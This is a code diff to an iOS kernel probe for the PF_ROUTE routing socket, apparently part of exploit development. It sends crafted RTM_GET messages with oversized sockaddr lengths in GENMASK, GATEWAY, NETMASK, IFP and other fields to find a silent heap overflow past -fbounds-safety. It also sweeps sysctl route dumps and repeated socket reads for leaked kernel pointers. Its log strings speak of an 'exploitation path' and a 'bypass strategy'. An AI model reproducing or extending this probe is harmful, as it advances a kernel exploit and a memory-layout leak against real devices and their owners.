@@ -6665,54 +6665,38 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
     }
 
     // ============================================================
-    // TEST 2: Bounds-safety detection — oversized genmask
+    // TEST 2: Safe GENMASK sa_len sweep (≤32 only — NO bounds-safety trigger)
     // ============================================================
-    [log appendString:@"\n--- TEST 2: Bounds-Safety Detection (oversized GENMASK) ---\n"];
-    [log appendString:@"  WARNING: If device panics here, iOS 26.2 has -fbounds-safety.\n"];
-    [log appendString:@"  This is the critical test — determines full exploit path.\n"];
+    [log appendString:@"\n--- TEST 2: Safe GENMASK sweep (sa_len=4..32, AF_INET) ---\n"];
+    [log appendString:@"  NO values > 32 — avoiding -fbounds-safety BRK.\n"];
+    // We know from v1 crash: AF_INET buffer=32bytes, sa_len=33 triggers BRK.
+    // Safe range: sa_len 4..32. Focus on kernel pointer leak in responses.
 
-    // We'll test increasing sa_len values: 4, 8, 16, 32, 33, 48, 64, 128
-    // AF_INET crashes at sa_len >= 33 on -fbounds-safety builds
-    // If the device survives sa_len=48, silent overflow is available
+    int safeLens[] = {4, 8, 12, 16, 20, 24, 28, 32};
+    int numSafelens = sizeof(safeLens) / sizeof(safeLens[0]);
+    int totalKptrCount = 0;
+    int survivingLens = 0;
 
-    // First, pre-flight: write a marker file so we know we were here
-    NSString *markerPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pf_probe_test2_start.txt"];
-    [@"test2_start" writeToFile:markerPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-
-    int crashLens[] = {4, 8, 16, 32, 33, 48, 64, 128};
-    int numLens = sizeof(crashLens) / sizeof(crashLens[0]);
-    int survivedCount = 0;
-
-    for (int ti = 0; ti < numLens; ti++) {
-        int gm_len = crashLens[ti];
+    for (int ti = 0; ti < numSafelens; ti++) {
+        int gm_len = safeLens[ti];
 
         char sa_buf[256];
         memset(sa_buf, 0, sizeof(sa_buf));
-        // DST sockaddr
         struct sockaddr_in *dst = (struct sockaddr_in *)sa_buf;
         dst->sin_family = AF_INET;
         dst->sin_len = sizeof(*dst);
         dst->sin_addr.s_addr = inet_addr("8.8.8.8");
         int off = sizeof(*dst);
 
-        // GENMASK sockaddr with controlled sa_len
         sa_buf[off] = gm_len;
         sa_buf[off+1] = AF_INET;
-        // Fill with 0xFF pattern for easy identification in dumps
+        // Fill with unique pattern per offset: A0..AF repeating
         for (int b = 2; b < gm_len && b < 255; b++) {
-            sa_buf[off+b] = 0xFF;
+            sa_buf[off+b] = (unsigned char)(0xA0 + (b & 0x0F));
         }
         int padded = (gm_len + 3) & ~3;
         if (padded < 4) padded = 4;
         off += padded;
-
-        // Write crash-site marker before each attempt
-        NSString *sitePath = [NSTemporaryDirectory()
-            stringByAppendingPathComponent:[NSString stringWithFormat:@"pf_t2_sa%d.txt", gm_len]];
-        [[NSString stringWithFormat:@"test2_sa_len_%d", gm_len]
-            writeToFile:sitePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-
-        [log appendFormat:@"  sa_len=%d (family=AF_INET)...", gm_len];
 
         memset(resp, 0, sizeof(resp));
         rlen = 0;
@@ -6720,35 +6704,31 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
                                resp, sizeof(resp), &rlen);
 
         if (rlen > 0) {
-            survivedCount++;
+            survivingLens++;
             struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
-            [log appendFormat:@" SURVIVED — read=%zd, type=%u, err=%d, addrs=0x%x\n",
-                rlen, r->rtm_type, r->rtm_errno, r->rtm_addrs];
-            // Quick scan for leaked pointers in response
-            NSString *subLabel = [NSString stringWithFormat:@"sa%d", gm_len];
-            pf_scanForKernelPtr((uint8_t*)resp, rlen, subLabel.UTF8String, log);
+            // Calculate expected response size: rt_msghdr + DST(16) + GENMASK(padded)
+            int expectedMin = (int)sizeof(struct pf_rt_msghdr) + 16 + padded;
+            int extraBytes = (int)rlen - expectedMin;
+            NSString *tag = [NSString stringWithFormat:@"gm%d", gm_len];
+            BOOL hasKptr = pf_scanForKernelPtr((uint8_t*)resp, rlen, tag.UTF8String, log);
+            if (hasKptr) totalKptrCount++;
+            [log appendFormat:@"  sa=%d: rd=%zd exp~%d extra=%d kptr=%s err=%d\n",
+                gm_len, rlen, expectedMin, extraBytes,
+                hasKptr ? "YES" : "no", r->rtm_errno];
+            // If extra > 0, dump the extra bytes
+            if (extraBytes > 0 && extraBytes < 128) {
+                [log appendFormat:@"    extra[%d]: ", extraBytes];
+                for (int ei = expectedMin; ei < (int)rlen && ei < expectedMin + 64; ei++)
+                    [log appendFormat:@"%02x", (unsigned char)resp[ei]];
+                [log appendString:@"\n"];
+            }
         } else {
-            [log appendFormat:@" FAIL — write=%d, read=%zd, errno=%d\n",
-                err, rlen, rlen < 0 ? errno : 0];
+            [log appendFormat:@"  sa=%d: write=%d read=%zd\n", gm_len, err, rlen];
         }
-
-        // Remove marker to track progress
-        [[NSFileManager defaultManager] removeItemAtPath:sitePath error:nil];
     }
 
-    [log appendFormat:@"\n  Survived %d/%d GENMASK tests\n", survivedCount, numLens];
-    if (survivedCount == numLens) {
-        [log appendString:@"  *** ALL SURVIVED: iOS 26.2 does NOT have -fbounds-safety on this path!\n"];
-        [log appendString:@"  *** Silent heap overflow is available — full exploitation path is OPEN.\n"];
-    } else if (survivedCount > 0) {
-        [log appendFormat:@"  *** PARTIAL: survived sa_len <= %d, crash beyond\n",
-            crashLens[survivedCount - 1]];
-    } else {
-        [log appendString:@"  *** NONE survived: -fbounds-safety active. Need bypass strategy.\n"];
-    }
-
-    // Clean up marker
-    [[NSFileManager defaultManager] removeItemAtPath:markerPath error:nil];
+    [log appendFormat:@"  Safe sweep: %d/%d responded, %d with kptr in response\n",
+        survivingLens, numSafelens, totalKptrCount];
 
     // ============================================================
     // TEST 3: Family enumeration with safe sa_len
@@ -6792,119 +6772,234 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
     }
 
     // ============================================================
-    // TEST 4: sa_len sweep for surviving families
     // ============================================================
-    [log appendString:@"\n--- TEST 4: sa_len Sweep (AF_INET, sa_len=4..128) ---\n"];
+    // TEST 4: sysctl dump channels (orthogonal kernel pointer leak)
+    // ============================================================
+    [log appendString:@"\n--- TEST 4: sysctl NET_RT_DUMP / DUMP2 / IFLIST2 ---\n"];
 
-    int sweepLens[] = {4, 8, 12, 16, 20, 24, 28, 32, 33, 36, 40, 44, 48,
-                        56, 64, 72, 80, 96, 128};
-    int numSweep = sizeof(sweepLens) / sizeof(sweepLens[0]);
-
-    for (int si = 0; si < numSweep; si++) {
-        int sl = sweepLens[si];
-
-        char sw_buf[256];
-        memset(sw_buf, 0, sizeof(sw_buf));
-        struct sockaddr_in *dd = (struct sockaddr_in *)sw_buf;
-        dd->sin_family = AF_INET;
-        dd->sin_len = sizeof(*dd);
-        dd->sin_addr.s_addr = inet_addr("1.1.1.1");  // different IP for new route lookup
-        int oo = sizeof(*dd);
-
-        sw_buf[oo] = sl;
-        sw_buf[oo+1] = AF_INET;
-        for (int b = 2; b < sl && b < 255; b++) {
-            sw_buf[oo+b] = (unsigned char)(0xA0 + (b & 0x0F));  // unique pattern per byte
-        }
-        int pad = (sl + 3) & ~3;
-        if (pad < 4) pad = 4;
-        oo += pad;
-
-        memset(resp, 0, sizeof(resp));
-        rlen = 0;
-        err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, sw_buf, oo,
-                               resp, sizeof(resp), &rlen);
-
-        BOOL hasKptr = NO;
-        if (rlen > 0) {
-            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
-            int resp_err = r->rtm_errno;
-            NSString *tag = [NSString stringWithFormat:@"sweep_sa%d", sl];
-            hasKptr = pf_scanForKernelPtr((uint8_t*)resp, rlen, tag.UTF8String, log);
-            if (!hasKptr) {
-                [log appendFormat:@"  sa_len=%d: %zd bytes err=%d — no kptr\n", sl, rlen, resp_err];
+    // 4a: NET_RT_DUMP
+    {
+        int mib[] = {4, 17, 0, AF_INET, 1, 0};
+        size_t needed = 0;
+        if (sysctl(mib, 6, NULL, &needed, NULL, 0) == 0 && needed > 0 && needed < 2*1024*1024) {
+            [log appendFormat:@"  NET_RT_DUMP needs %zu bytes\n", needed];
+            char *rtbuf = (char*)malloc(needed);
+            if (rtbuf && sysctl(mib, 6, rtbuf, &needed, NULL, 0) == 0) {
+                pf_scanForKernelPtr((uint8_t*)rtbuf, needed, "RT_DUMP", log);
+                // Also scan for zone free patterns (0xdeadbeef etc)
+                int zoneHits = 0;
+                for (size_t i = 0; i + 7 < needed; i += 8) {
+                    uint64_t v = *(uint64_t*)(rtbuf + i);
+                    if (v == 0 || v == 0xdeadbeefdeadbeefULL || v == 0xffffffffffffffffULL) continue;
+                    if ((v & 0xffff000000000000ULL) == 0xffff000000000000ULL) zoneHits++;
+                }
+                [log appendFormat:@"    zone-free candidates: %d non-null 64-bit values in range\n", zoneHits];
             }
+            free(rtbuf);
         } else {
-            [log appendFormat:@"  sa_len=%d: write=%d read=%zd — no response\n", sl, err, rlen];
+            [log appendFormat:@"  NET_RT_DUMP failed (needed=%zu)\n", needed];
+        }
+    }
+
+    // 4b: NET_RT_DUMP2
+    {
+        int mib2[] = {4, 17, 0, 0, 7, 0};  // NET_RT_DUMP2, all families
+        size_t needed2 = 0;
+        if (sysctl(mib2, 6, NULL, &needed2, NULL, 0) == 0 && needed2 > 0 && needed2 < 2*1024*1024) {
+            [log appendFormat:@"  NET_RT_DUMP2 needs %zu bytes, fetching...\n", needed2];
+            char *buf2 = (char*)malloc(needed2);
+            if (buf2 && sysctl(mib2, 6, buf2, &needed2, NULL, 0) == 0) {
+                pf_scanForKernelPtr((uint8_t*)buf2, needed2, "RT_DUMP2", log);
+            }
+            free(buf2);
+        } else {
+            [log appendFormat:@"  NET_RT_DUMP2 failed (needed=%zu)\n", needed2];
+        }
+    }
+
+    // 4c: NET_RT_IFLIST2
+    {
+        int mib3[] = {4, 17, 0, 0, 6, 0};  // NET_RT_IFLIST2
+        size_t needed3 = 0;
+        if (sysctl(mib3, 6, NULL, &needed3, NULL, 0) == 0 && needed3 > 0 && needed3 < 2*1024*1024) {
+            [log appendFormat:@"  NET_RT_IFLIST2 needs %zu bytes, fetching...\n", needed3];
+            char *buf3 = (char*)malloc(needed3);
+            if (buf3 && sysctl(mib3, 6, buf3, &needed3, NULL, 0) == 0) {
+                pf_scanForKernelPtr((uint8_t*)buf3, needed3, "RT_IFLIST2", log);
+            }
+            free(buf3);
+        } else {
+            [log appendFormat:@"  NET_RT_IFLIST2 failed (needed=%zu)\n", needed3];
         }
     }
 
     // ============================================================
-    // TEST 5: sysctl NET_RT_DUMP kernel pointer scan
+    // TEST 5: Oversized NON-GENMASK fields
+    //   KEY TEST — GATEWAY/NETMASK/IFP/IFA may use different code
+    //   paths than GENMASK. If any lack -fbounds-safety, silent
+    //   heap overflow is possible through those fields.
     // ============================================================
-    [log appendString:@"\n--- TEST 5: sysctl NET_RT_DUMP kernel pointer scan ---\n"];
+    [log appendString:@"\n--- TEST 5: Oversized NON-GENMASK fields (GATEWAY / NETMASK / IFP / IFA) ---\n"];
+    [log appendString:@"  These bypass rn_addmask() — different code paths!\n"];
 
-    int mib[] = {4, 17, 0, AF_INET, 1, 0};  // CTL_NET, PF_ROUTE, 0, AF_INET, NET_RT_DUMP
-    size_t needed = 0;
-    if (sysctl(mib, 6, NULL, &needed, NULL, 0) == 0 && needed > 0 && needed < 2*1024*1024) {
-        [log appendFormat:@"  NET_RT_DUMP needs %zu bytes, fetching...\n", needed];
-        char *rtbuf = (char*)malloc(needed);
-        if (rtbuf && sysctl(mib, 6, rtbuf, &needed, NULL, 0) == 0) {
-            pf_scanForKernelPtr((uint8_t*)rtbuf, needed, "RT_DUMP", log);
+    // Test oversized sa_len on each non-GENMASK RTA field
+    // Each sub-test: RTM_GET with DST + oversized FIELD
+    // AF_INET buffer for each field is unknown — start safe, find crash threshold
+
+    typedef struct { int flag; const char *name; } RtaField;
+    RtaField fields[] = {
+        {RTA_GATEWAY, "GATEWAY"},
+        {RTA_NETMASK, "NETMASK"},
+        {RTA_IFP,     "IFP"},
+        {RTA_IFA,     "IFA"},
+        {RTA_AUTHOR,  "AUTHOR"},
+        {RTA_BRD,     "BRD"},
+    };
+    int numFields = sizeof(fields) / sizeof(fields[0]);
+
+    // Step up carefully: start from safe (16), increase gradually
+    // Stop BEFORE any field causes a panic
+    int oversizedLens[] = {16, 20, 24, 28, 32, 40, 48, 56, 64, 80, 96, 128};
+    int numOSLens = sizeof(oversizedLens) / sizeof(oversizedLens[0]);
+    int crashed = 0;
+
+    for (int fi = 0; fi < numFields && !crashed; fi++) {
+        [log appendFormat:@"\n  --- %s (flag=0x%02x) ---\n", fields[fi].name, fields[fi].flag];
+
+        for (int li = 0; li < numOSLens && !crashed; li++) {
+            int bigLen = oversizedLens[li];
+
+            char os_buf[512];
+            memset(os_buf, 0, sizeof(os_buf));
+            struct sockaddr_in *d = (struct sockaddr_in *)os_buf;
+            d->sin_family = AF_INET;
+            d->sin_len = sizeof(*d);
+            d->sin_addr.s_addr = inet_addr("8.8.8.8");
+            int o = sizeof(*d);
+
+            // The oversized field: sa_len=bigLen, family=AF_INET, payload=0xBB pattern
+            os_buf[o] = bigLen;
+            os_buf[o+1] = AF_INET;
+            for (int b = 2; b < bigLen && b < 255; b++) {
+                os_buf[o+b] = (unsigned char)(0xBB + (b & 0x03));
+            }
+            int pad = (bigLen + 3) & ~3;
+            if (pad < 4) pad = 4;
+            o += pad;
+
+            // Write marker before each attempt
+            NSString *osMarker = [NSTemporaryDirectory()
+                stringByAppendingPathComponent:[NSString stringWithFormat:@"pf_os_%s_%d.txt",
+                fields[fi].name, bigLen]];
+            [[NSString stringWithFormat:@"oversized_%s_%d", fields[fi].name, bigLen]
+                writeToFile:osMarker atomically:YES encoding:NSUTF8StringEncoding error:nil];
+
+            memset(resp, 0xCC, sizeof(resp));  // 0xCC fill to detect uninitialized regions
+            rlen = 0;
+            int addrs = RTA_DST | fields[fi].flag;
+            err = pf_sendRouteMsg(RTM_GET, addrs, os_buf, o, resp, sizeof(resp), &rlen);
+
+            if (rlen > 0) {
+                struct pf_rt_msghdr *rr = (struct pf_rt_msghdr *)resp;
+                int respErr = rr->rtm_errno;
+                NSString *tag = [NSString stringWithFormat:@"%s_%d", fields[fi].name, bigLen];
+                pf_scanForKernelPtr((uint8_t*)resp, rlen, tag.UTF8String, log);
+
+                // Check if response has trailing 0xCC (uninitialized buffer leak)
+                int ccCount = 0;
+                for (int ci = (int)rlen - 1; ci >= 0 && (unsigned char)resp[ci] == 0xCC; ci--) {
+                    ccCount++;
+                }
+                if (ccCount > 0) {
+                    [log appendFormat:@"    *** UNINIT RESPONSE: %d trailing 0xCC bytes (info leak!)\n", ccCount];
+                }
+
+                [log appendFormat:@"    len=%d: rd=%zd err=%d ccTail=%d\n",
+                    bigLen, rlen, respErr, ccCount];
+            } else {
+                [log appendFormat:@"    len=%d: write=%d read=%zd — no response (possibly filtered)\n",
+                    bigLen, err, rlen];
+            }
+
+            [[NSFileManager defaultManager] removeItemAtPath:osMarker error:nil];
         }
-        free(rtbuf);
-    } else {
-        [log appendFormat:@"  NET_RT_DUMP failed or too large (needed=%zu)\n", needed];
     }
 
     // ============================================================
-    // TEST 6: RTM_GET with all address flags (stress test)
+    // TEST 6: Repeated read() on fresh sockets — heap info leak
     // ============================================================
-    [log appendString:@"\n--- TEST 6: All RTA flags (DST+GW+MASK+GENMASK) ---\n"];
+    [log appendString:@"\n--- TEST 6: Repeated fresh-socket read() leak scan ---\n"];
+    [log appendString:@"  Allocate fresh socket per query, scan for heap data in response\n"];
 
     {
-        char full_buf[512];
-        memset(full_buf, 0, sizeof(full_buf));
-        int o = 0;
-        // DST: 8.8.8.8
-        struct sockaddr_in *sd = (struct sockaddr_in *)(full_buf + o);
-        sd->sin_family = AF_INET; sd->sin_len = sizeof(*sd);
-        sd->sin_addr.s_addr = inet_addr("8.8.8.8"); o += sizeof(*sd);
-        // GW: 192.168.1.1
-        struct sockaddr_in *sg = (struct sockaddr_in *)(full_buf + o);
-        sg->sin_family = AF_INET; sg->sin_len = sizeof(*sg);
-        sg->sin_addr.s_addr = inet_addr("192.168.1.1"); o += sizeof(*sg);
-        // NETMASK: 255.255.255.0
-        struct sockaddr_in *sm = (struct sockaddr_in *)(full_buf + o);
-        sm->sin_family = AF_INET; sm->sin_len = sizeof(*sm);
-        sm->sin_addr.s_addr = inet_addr("255.255.255.0"); o += sizeof(*sm);
-        // GENMASK: 255.255.0.0
-        struct sockaddr_in *sgm = (struct sockaddr_in *)(full_buf + o);
-        sgm->sin_family = AF_INET; sgm->sin_len = sizeof(*sgm);
-        sgm->sin_addr.s_addr = inet_addr("255.255.0.0"); o += sizeof(*sgm);
+        int leakHits = 0;
+        int totalScans = 0;
+        for (int ri = 0; ri < 10; ri++) {
+            char lbuf[4096];
+            ssize_t lr = 0;
+            int fd2 = socket(PF_ROUTE, SOCK_RAW, 0);
+            if (fd2 < 0) continue;
 
-        int allFlags = RTA_DST | RTA_GATEWAY | RTA_NETMASK | RTA_GENMASK;
-        memset(resp, 0, sizeof(resp));
-        rlen = 0;
-        err = pf_sendRouteMsg(RTM_GET, allFlags, full_buf, o, resp, sizeof(resp), &rlen);
-        [log appendFormat:@"  All-flags RTM_GET: write=%d, read=%zd\n", err, rlen];
-        if (rlen > 0) {
-            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
-            [log appendFormat:@"  type=%u err=%d addrs=0x%x\n", r->rtm_type, r->rtm_errno, r->rtm_addrs];
-            pf_scanForKernelPtr((uint8_t*)resp, rlen, "allFlags", log);
+            struct pf_rt_msghdr lrtm;
+            memset(&lrtm, 0, sizeof(lrtm));
+            lrtm.rtm_type = RTM_GET;
+            lrtm.rtm_version = RTM_VERSION;
+            lrtm.rtm_seq = ri + 100;
+            lrtm.rtm_addrs = RTA_DST;
+            char lsa[32];
+            memset(lsa, 0, sizeof(lsa));
+            struct sockaddr_in *ld = (struct sockaddr_in *)lsa;
+            ld->sin_family = AF_INET;
+            ld->sin_len = sizeof(*ld);
+            ld->sin_addr.s_addr = inet_addr("8.8.8.8");
+            lrtm.rtm_msglen = sizeof(lrtm) + sizeof(*ld);
+
+            char lsend[256];
+            memset(lsend, 0, sizeof(lsend));
+            memcpy(lsend, &lrtm, sizeof(lrtm));
+            memcpy(lsend + sizeof(lrtm), lsa, sizeof(*ld));
+
+            ssize_t lw = write(fd2, lsend, lrtm.rtm_msglen);
+            if (lw > 0) {
+                struct timeval tv = {.tv_sec = 0, .tv_usec = 100000};
+                setsockopt(fd2, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+                lr = read(fd2, lbuf, sizeof(lbuf));
+            }
+            close(fd2);
+
+            if (lr > (ssize_t)(sizeof(struct pf_rt_msghdr) + 16)) {
+                totalScans++;
+                NSString *lkTag = [NSString stringWithFormat:@"fresh%d", ri];
+                BOOL hit = pf_scanForKernelPtr((uint8_t*)lbuf, lr, lkTag.UTF8String, log);
+                if (hit) leakHits++;
+
+                // Count non-zero bytes after expected response
+                int expectedEnd = (int)sizeof(struct pf_rt_msghdr) + 16;
+                int nonZeroTail = 0;
+                for (int ti = expectedEnd; ti < (int)lr && ti < expectedEnd + 256; ti++) {
+                    if ((unsigned char)lbuf[ti] != 0 && (unsigned char)lbuf[ti] != 0xCC) {
+                        nonZeroTail++;
+                    }
+                }
+                if (nonZeroTail > 0) {
+                    [log appendFormat:@"  fresh#%d: %zd bytes, %d non-zero after expected end\n",
+                        ri, lr, nonZeroTail];
+                }
+            }
         }
+        [log appendFormat:@"  Repeated read scan: %d/%d responses had kptr patterns\n", leakHits, totalScans];
     }
 
     // ============================================================
     // SUMMARY
     // ============================================================
-    [log appendString:@"\n========== PF_ROUTE Probe Complete =========="];
-    [log appendString:@"\nTest 1: Safe baseline — confirms PF_ROUTE is accessible"];
-    [log appendString:@"\nTest 2: Bounds-safety — THE critical test for exploit viability"];
-    [log appendString:@"\nTest 3: Family enum — which families are usable"];
-    [log appendString:@"\nTest 4: sa_len sweep — overflow distance + leak potential"];
-    [log appendString:@"\nTest 5: sysctl dump — orthogonal leak channel"];
-    [log appendString:@"\nTest 6: All flags — complex message handling"];
+    [log appendString:@"\n========== PF_ROUTE v2 Probe Complete =========="];
+    [log appendString:@"\nTest 1: Safe baseline — PF_ROUTE accessibility check"];
+    [log appendString:@"\nTest 2: Safe GENMASK sweep (4..32) — kernel ptr in response"];
+    [log appendString:@"\nTest 3: Family enum — cross-family safe sa_len"];
+    [log appendString:@"\nTest 4: sysctl dumps — NET_RT_DUMP/DUMP2/IFLIST2 leak channels"];
+    [log appendString:@"\nTest 5: Oversized NON-GENMASK — GATEWAY/NETMASK/IFP/IFA paths"];
+    [log appendString:@"\nTest 6: Repeated fresh-socket read() — heap info leak scan"];
 
     // Write results to file for post-reboot analysis
     NSString *resultPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pf_probe_results.txt"];
